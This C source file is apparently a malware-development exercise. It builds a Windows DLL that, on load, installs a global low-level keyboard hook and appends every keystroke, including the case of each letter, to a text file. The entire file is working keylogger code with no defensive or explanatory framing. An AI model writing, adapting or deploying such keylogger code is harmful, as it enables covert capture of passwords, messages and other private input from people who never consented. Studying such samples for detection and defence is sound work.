#include <windows.h>
#include <stdio.h>

HHOOK hHook = NULL;
HINSTANCE hInstance = NULL;
FILE* file;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) { // Check if action is taking place
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam; // Get the structure containing information about a low-level keyboard input event

        if (wParam == WM_KEYDOWN) { // Check if a key is being pressed down
            if (file != NULL) { // Check if the file pointer is not null
                if (p->vkCode == VK_RETURN) { // Check if the pressed key is the Enter/Return key
                    fprintf(file, "\n"); // Write a newline character to the file
                }
                else {
                    SHORT shiftState = GetAsyncKeyState(VK_SHIFT); // Get the state of the Shift key
                    CHAR character; // Variable to hold the character
                    BYTE keyboardState[256]; // Array to hold the state of each key on the keyboard

                    GetKeyboardState(keyboardState); // Get the current state of the keyboard
                    ToAscii(p->vkCode, p->scanCode, keyboardState, (LPWORD)&character, 0); // Translate the virtual-key code and keyboard state to the corresponding character value

                    if (!(shiftState & 0x8000)) { // Check if Shift key is not pressed
                        character = tolower(character); // Convert character to lowercase
                    }

                    fprintf(file, "%c", character); // Write the character to the file
                    fflush(file); // Flush the output buffer to the file
                }
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam); // Pass the hook information to the next hook procedure in the current hook chain
}

DWORD WINAPI MyThreadFunction(LPVOID lpParam) {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        hInstance = hinstDLL;

        fopen_s(&file, "C:\\Users\\mjank\\Documents\\MalDev\\Test\\test.txt", "a");
        if (file == NULL) {
            return FALSE;
        }

        CreateThread(NULL, 0, MyThreadFunction, NULL, 0, NULL);
        break;

    case DLL_PROCESS_DETACH:
        if (hHook != NULL) {
            UnhookWindowsHookEx(hHook);
        }
        if (file != NULL) {
            fclose(file);
        }
        break;
    }

    return TRUE;
}
